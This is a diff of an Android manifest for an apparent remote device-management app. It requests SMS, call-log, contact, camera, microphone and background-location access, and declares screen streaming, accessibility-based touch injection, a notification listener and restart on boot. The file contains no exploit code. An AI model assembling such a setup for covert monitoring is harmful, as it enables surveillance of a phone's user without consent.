@@ -2,51 +2,65 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- Hardware Features -->
-    <uses-feature android:name="android.hardware.telephony" android:required="false" />
-
-    <!-- Network and Telemetry -->
+    <!-- Network -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
 
-    <!-- Location Monitoring -->
+    <!-- Location -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+
+    <!-- Camera -->
+    <uses-permission android:name="android.permission.CAMERA" />
+
+    <!-- Microphone (for screen recording audio) -->
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+
+    <!-- Contacts -->
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+
+    <!-- Call Log -->
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+
+    <!-- SMS -->
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+
+    <!-- Storage (for older Android versions; scoped storage used on 10+) -->
+    <uses-permission
+        android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
 
     <!-- Foreground Services -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CONNECTED_DEVICE" />
+
+    <!-- Notifications -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
-    <!-- Hardware & Telemetry Features (Optional consent based) -->
-    <uses-permission android:name="android.permission.CAMERA" />
-    <uses-permission android:name="android.permission.RECORD_AUDIO" />
-    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
-    <uses-permission android:name="android.permission.READ_CALL_LOG" />
-    <uses-permission android:name="android.permission.READ_SMS" />
-    <uses-permission android:name="android.permission.READ_CONTACTS" />
-    
-    <!-- Files and Media Storage Access -->
-    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="29" />
-    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
-    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
-    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
-    
-    <!-- Package Querying for App Inventory -->
+    <!-- Wake Lock -->
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+
+    <!-- Boot Completed -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <!-- Query all packages (for usage stats app name resolution) -->
     <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
         tools:ignore="QueryAllPackagesPermission" />
 
-    <!-- Special access via system settings -->
+    <!-- Package Usage Stats (special permission, granted via Settings) -->
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
         tools:ignore="ProtectedPermissions" />
 
     <uses-feature android:name="android.hardware.camera" android:required="false" />
-    <uses-feature android:name="android.hardware.microphone" android:required="false" />
+    <uses-feature android:name="android.hardware.location" android:required="false" />
     <uses-feature android:name="android.hardware.location.gps" android:required="false" />
+    <uses-feature android:name="android.hardware.microphone" android:required="false" />
+    <uses-feature android:name="android.hardware.telephony" android:required="false" />
 
     <application
         android:name=".DeviceManagerApp"
@@ -57,44 +71,68 @@
         android:label="@string/app_name"
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
-        android:usesCleartextTraffic="true"
-        android:theme="@style/Theme.MyApplication">
+        android:theme="@style/Theme.DeviceManager"
+        android:networkSecurityConfig="@xml/network_security_config"
+        tools:targetApi="34">
 
+        <!-- Setup Activity (launcher) -->
         <activity
-            android:name=".MainActivity"
+            android:name=".ui.SetupActivity"
             android:exported="true"
-            android:label="@string/app_name"
-            android:windowSoftInputMode="adjustResize"
-            android:theme="@style/Theme.MyApplication">
+            android:theme="@style/Theme.DeviceManager">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <!-- Official Transparent Foreground Service -->
+        <!-- Main Activity -->
+        <activity
+            android:name=".ui.MainActivity"
+            android:exported="false"
+            android:theme="@style/Theme.DeviceManager" />
+
+        <!-- Permissions Activity -->
+        <activity
+            android:name=".ui.PermissionsActivity"
+            android:exported="false"
+            android:theme="@style/Theme.DeviceManager" />
+
+        <!-- Main Foreground Service: keeps app alive, manages WebSocket -->
         <service
-            android:name=".service.DeviceManagementService"
-            android:enabled="true"
+            android:name=".services.MainForegroundService"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
 
-        <!-- Official Android NotificationListenerService -->
+        <!-- Notification Listener Service -->
         <service
-            android:name=".service.NotificationMonitorService"
-            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
-            android:exported="true">
+            android:name=".services.NotificationListener"
+            android:exported="true"
+            android:label="@string/notification_listener_label"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
         </service>
 
-        <!-- Official Android AccessibilityService -->
+        <!-- Screen Record Service (MediaProjection) -->
         <service
-            android:name=".service.DeviceAccessibilityService"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:label="@string/accessibility_service_label"
-            android:exported="true">
+            android:name=".services.ScreenRecordService"
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection" />
+
+        <!-- Screen Stream Service (MediaProjection for remote control) -->
+        <service
+            android:name=".services.ScreenStreamService"
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection" />
+
+        <!-- Remote Input Service (AccessibilityService for touch injection) -->
+        <service
+            android:name=".services.RemoteInputService"
+            android:exported="true"
+            android:label="@string/remote_input_label"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
@@ -103,24 +141,31 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- Real Remote Camera Capture Activity (Translucent) -->
-        <activity
-            android:name=".service.CameraCaptureActivity"
-            android:exported="false"
-            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
-
-        <!-- Screen Recording Helper Activity (Translucent) -->
-        <activity
-            android:name=".service.ScreenRecordHelperActivity"
-            android:exported="false"
-            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
-
-        <!-- Screen Recording Foreground Service -->
+        <!-- Camera Capture Service -->
         <service
-            android:name=".service.ScreenRecordService"
-            android:enabled="true"
+            android:name=".services.CameraCaptureService"
             android:exported="false"
-            android:foregroundServiceType="mediaProjection" />
+            android:foregroundServiceType="camera" />
+
+        <!-- Boot Receiver to restart foreground service -->
+        <receiver
+            android:name=".services.BootReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- FileProvider for captured media -->
+        <provider
+            android:name="androidx.core.content.FileProvider"
+            android:authorities="${applicationId}.fileprovider"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/file_paths" />
+        </provider>
 
     </application>
 
